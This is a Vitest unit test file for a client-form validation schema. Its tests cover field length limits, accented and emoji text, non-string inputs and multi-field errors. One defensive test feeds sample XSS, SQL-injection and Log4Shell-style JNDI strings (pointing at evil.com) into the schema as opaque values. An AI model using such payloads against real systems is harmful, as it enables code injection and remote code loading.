// -----------------------------------------------------------------------------
// Story 2.3 — Create Client (BMad-Integrated automate expansion)
// Boundary + edge-case unit tests for clienteFormSchema.
//
// Covers gaps the ATDD suite intentionally leaves out:
//   - Exact-max boundaries (200 / 50 / 50 / 100) that must PASS.
//   - Unicode and accented characters that must be preserved verbatim.
//   - HTML / XSS-like payloads that must be treated as opaque strings.
//   - Non-string inputs must fail with type error (defense-in-depth).
//   - Multi-field failure: schema reports ALL failing fields, not just first.
// -----------------------------------------------------------------------------
import { describe, it, expect } from 'vitest'
import { clienteFormSchema } from './clienteSchema'

const base = { nombre: 'A', nit: 'B', telefono: 'C', ciudad: 'D' }

describe('clienteFormSchema — boundary lengths', () => {
  it('[P1] accepts nombre with exactly 200 chars (upper boundary inclusive)', () => {
    const result = clienteFormSchema.safeParse({ ...base, nombre: 'a'.repeat(200) })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.nombre).toHaveLength(200)
    }
  })

  it('[P1] accepts nit with exactly 50 chars (upper boundary inclusive)', () => {
    const result = clienteFormSchema.safeParse({ ...base, nit: 'a'.repeat(50) })
    expect(result.success).toBe(true)
  })

  it('[P1] accepts telefono with exactly 50 chars (upper boundary inclusive)', () => {
    const result = clienteFormSchema.safeParse({ ...base, telefono: 'a'.repeat(50) })
    expect(result.success).toBe(true)
  })

  it('[P1] accepts ciudad with exactly 100 chars (upper boundary inclusive)', () => {
    const result = clienteFormSchema.safeParse({ ...base, ciudad: 'a'.repeat(100) })
    expect(result.success).toBe(true)
  })

  it('[P2] accepts single-char values at the lower boundary (min 1 after trim)', () => {
    const result = clienteFormSchema.safeParse({
      nombre: 'A',
      nit: '1',
      telefono: '0',
      ciudad: 'X',
    })
    expect(result.success).toBe(true)
  })

  it('[P2] trims surrounding whitespace and validates the trimmed length against the max', () => {
    // 200 non-space chars + 20 leading/trailing spaces → trims to 200, still valid.
    const nombre = '   ' + 'a'.repeat(200) + '   '
    const result = clienteFormSchema.safeParse({ ...base, nombre })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.nombre).toHaveLength(200)
    }
  })
})

describe('clienteFormSchema — unicode and locale characters', () => {
  it('[P2] preserves accented Spanish characters (Latin-1 Supplement)', () => {
    const payload = {
      nombre: 'Comercializadora Águilas Ñandú S.A.S.',
      nit: '900-1',
      telefono: '+57 300 000 0000',
      ciudad: 'Bogotá D.C.',
    }
    const result = clienteFormSchema.safeParse(payload)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.nombre).toContain('Águilas')
      expect(result.data.nombre).toContain('Ñandú')
      expect(result.data.ciudad).toBe('Bogotá D.C.')
    }
  })

  it('[P3] accepts emoji and multi-byte characters as valid strings', () => {
    const result = clienteFormSchema.safeParse({
      nombre: 'Empresa 🚀 Tech',
      nit: '900-1',
      telefono: '+57 300 000 0000',
      ciudad: '東京',
    })
    expect(result.success).toBe(true)
  })
})

describe('clienteFormSchema — untrusted content (NFR5 defense-in-depth)', () => {
  it('[P2] accepts HTML-looking payloads as opaque strings (escaping is renderer responsibility)', () => {
    const payload = {
      nombre: '<script>alert("xss")</script>',
      nit: "') OR '1'='1",
      telefono: '"><img src=x onerror=alert(1)>',
      ciudad: '${jndi:ldap://evil.com/a}',
    }
    const result = clienteFormSchema.safeParse(payload)
    // Schema is intentionally content-agnostic — React and the DOM API escape
    // output. The schema's job is length + required only.
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.nombre).toBe('<script>alert("xss")</script>')
    }
  })
})

describe('clienteFormSchema — non-string inputs (type safety)', () => {
  it.each([
    ['number', 12345],
    ['boolean', true],
    ['null', null],
    ['undefined', undefined],
    ['array', ['abc']],
    ['object', { toString: () => 'abc' }],
  ] as const)('[P2] rejects when nombre is %s', (_label, badValue) => {
    const result = clienteFormSchema.safeParse({ ...base, nombre: badValue as unknown as string })
    expect(result.success).toBe(false)
  })

  it('[P2] rejects when nit is missing entirely', () => {
    // TS would prevent this at compile time; safeParse is defensive at runtime.
    const result = clienteFormSchema.safeParse({
      nombre: 'A',
      telefono: 'C',
      ciudad: 'D',
    } as unknown as { nombre: string; nit: string; telefono: string; ciudad: string })
    expect(result.success).toBe(false)
  })
})

describe('clienteFormSchema — multi-field failures reported together', () => {
  it('[P1] reports 4 issues when all 4 fields are empty', () => {
    const result = clienteFormSchema.safeParse({ nombre: '', nit: '', telefono: '', ciudad: '' })
    expect(result.success).toBe(false)
    if (!result.success) {
      const paths = result.error.issues.map((i) => i.path[0])
      expect(paths).toEqual(expect.arrayContaining(['nombre', 'nit', 'telefono', 'ciudad']))
      expect(result.error.issues).toHaveLength(4)
    }
  })

  it('[P2] reports both required + maxlength when the input mixes both failures', () => {
    const result = clienteFormSchema.safeParse({
      nombre: '', // required error
      nit: 'x'.repeat(51), // maxlength error
      telefono: 'ok',
      ciudad: 'ok',
    })
    expect(result.success).toBe(false)
    if (!result.success) {
      const fields = result.error.issues.map((i) => i.path[0])
      expect(fields).toEqual(expect.arrayContaining(['nombre', 'nit']))
      expect(fields).not.toContain('telefono')
      expect(fields).not.toContain('ciudad')
    }
  })
})
